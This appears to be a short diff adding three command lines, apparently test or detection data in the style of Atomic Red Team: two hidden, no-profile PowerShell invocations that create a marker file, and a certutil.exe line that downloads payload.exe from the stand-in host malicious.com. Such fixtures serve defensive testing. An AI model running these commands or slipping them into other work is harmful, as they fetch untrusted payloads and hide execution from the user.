@@ -1,0 +1,3 @@
+C:\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt
+powershell.exe  -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt
+certutil.exe -f -split -f http://malicious.com/payload.exe payload.exe
